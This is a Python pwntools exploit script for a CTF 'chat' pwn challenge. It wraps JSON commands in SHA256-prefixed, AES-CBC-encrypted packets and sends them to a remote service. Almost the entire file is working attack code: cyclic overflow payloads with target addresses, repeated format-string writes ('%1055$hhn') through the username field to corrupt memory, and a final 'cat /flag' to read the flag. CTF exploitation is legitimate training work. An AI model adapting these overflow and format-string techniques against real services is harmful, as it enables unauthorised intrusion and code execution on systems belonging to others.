from pwn import *
from Crypto.Cipher import AES
import json

context.log_level = 'debug'
context.binary = "/home/v1ct0r/桌面/desktop/ctf/2021huaweictf/pwn1/chat"
# context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary
ip=sys.argv[1]
port=int(sys.argv[2])
p = remote(ip,port)
    

def g():
    gdbscript= """
    #b *0x418783
    #b *0x41a24b
    #b *0x4072ad
    #b *0x40449d
    b *0x4044bd
    """
    gdb.attach(p,gdbscript=gdbscript)
#payload  = cyclic(0x100)
iv = b"a"*16
#psd = p64(0xde50000d89b5a193)
msg = "this is a message"

#payload = json.dumps({"cmd":"register","username":"%s%s%s%s%s%s","email":"root@mail.com"})
#payload = json.dumps({9:})
def pak(data):
    data = p64(data)
    payload = b""
    for _ in data:
        payload += b"1e2."+_.to_bytes(1,'big')
    return payload

def aa(data):
    payload = b""
    for _ in data:
        payload += b"1e2."+_.to_bytes(1,'big')
    return payload
#payload = b"1e2.0"*0x216+pak(p64(0xdeadbeefdeadbeef))+pak(p64(0xdaedbeefdeadbeef))
#payload = b"1e2.\x41"*(0x216-0x29+8)+b"1\x00"
#payload = b"1\x00"

payload = b"1e2.\x00"*6+pak(elf.bss(0x200))*66+b"1\x00"
payload = sha256sum(payload)+ payload

def aes_encrypt(key,data):
    cipher = AES.new(key,AES.MODE_CBC,iv)
    length = 16 - (len(data) % 16)
    data += bytes([length])*length
    c = cipher.encrypt(data)
    return c

def aes_decrypt(data):
    cipher = AES.new(key,AES.MODE_CBC,iv)
    c = cipher.decrypt(data)
    return c


def pkt(user,data,session):
    if isinstance(data,str):
        data = data.encode()
    payload = data
    payload = sha256sum(payload) + payload
    if session:
        payload = iv +aes_encrypt(session,payload)
    p.send(p32(len(payload)+4))
    p.send(p32(user))
    p.send(payload)
    # b=0
    # c=0x40
    # while b<len(payload):
    #     if b+c > len(payload):
    #         p.send(payload[b:])
    #     else:
    #         p.send(payload[b:b+c])
    #     sleep(0.1)
    #     b += c


def exec_fmt(payload):
    global p
    p = process(context.binary.path)
    pkt(1,b'{"cmd":"register","username":"%s","email":"root@mail.com"})' % payload,None)
    r = p.recvuntil(b'}')
    print(r)
    a = json.loads(r)
    key = a['session'].encode('latin1')
    pkt(2,json.dumps({"cmd":"send_msg","to":"root","msg":"asdasd"}),key)
    pkt(2,json.dumps({"cmd":"info"}).encode(),key)

    p.recvuntil("name")
    return p.recvuntil(b"}")

#writes = {elf.got['isspace']:0x418540}

def exp():
    #g()
    #payload = "%"
    #payload = fmtstr_payload(9, writes, numbwritten=8)
    #print(payload)
    #pkt(1,b'{"cmd":"register","username":"%s","email":"root@mail.com"}'%payload ,None)
    #pkt(1,b"1e2.\x42"*0x210+b"1\x00",None)
    #print(cyclic(0x200))
    #pause()

    # pkt(1,aa(cyclic(518))+aa(p64(0x62c110))+b"1\x00",None)
    pkt(1,aa(cyclic(518))+aa(p64(0x62c110)),None)
    p.recvline()
    #pkt(1,json.dumps({"cmd":"register","username":"%1050$pAA%1051$pAA%1052$pAA%1053$pAA%1054$pAA%1055$pAA%1056$pAA%1057$pAA%1058$pAA%1059$p","email":"root@mail.com"}).encode(),None)
    #pkt(1,json.dumps({"cmd":"register","username":"rrrr","email":"root@mail.com"}).encode(),None)
    #print(p.recvline())
    pkt(1,json.dumps({"cmd":"register","username":58*'a'+"%1055$hhn","email":"root@mail.com"}).encode(),None)
    r = p.recvline()
    a = json.loads(r)
    key = a['session'].encode('latin1')
    print(key)
    #pkt(1,json.dumps({"cmd":"send_msg","to":"root","msg":"asdasd"}).encode(),None)

    #pkt(1,json.dumps({"cmd":"info"}).encode(),None)
    #pkt(2,json.dumps({"cmd":"send_msg","to":"root","msg":"asdasd"}),key)
    pkt(2,json.dumps({"cmd":"info"}).encode(),key)
    p.recvline()
    #payload = fmtstr_payload(5, writes, numbwritten=8)
    pkt(1,aa(cyclic(518))+aa(p64(0x62c111)),None)
    p.recvline()
    pkt(1,json.dumps({"cmd":"register","username":127*'a'+"%1055$hhn","email":"raat@mail.com"}).encode(),None)
    r = p.recvline()
    a = json.loads(r)

    print(a)
    key = a['session'].encode('latin1')
    print(key)
    pkt(3,json.dumps({"cmd":"info"}).encode(),key)
    p.recvline()
    pkt(1,aa(cyclic(518))+aa(p64(0x62c112)),None)
    p.recvline()
    pkt(1,json.dumps({"cmd":"register","username":59*'a'+"%1055$hhn","email":"raat@mail.com"}).encode(),None)
    r = p.recvline()
    a = json.loads(r)

    print(a)
    key = a['session'].encode('latin1')
    print(key)
    pkt(4,json.dumps({"cmd":"info"}).encode(),key)
    #pkt(3,json.dumps({"cmd":"info"}))
    #pkt(1,b"1e2.\x00"*6+pak(elf.bss(0x200))*66+b"1\x00",None)
    p.send(p32(0))
    p.recvuntil("Do not touch this function")
    p.sendline('cat /flag')     
    print(p.recvrepeat(1))
    # p.interactive()
if __name__ == "__main__":
    exp()
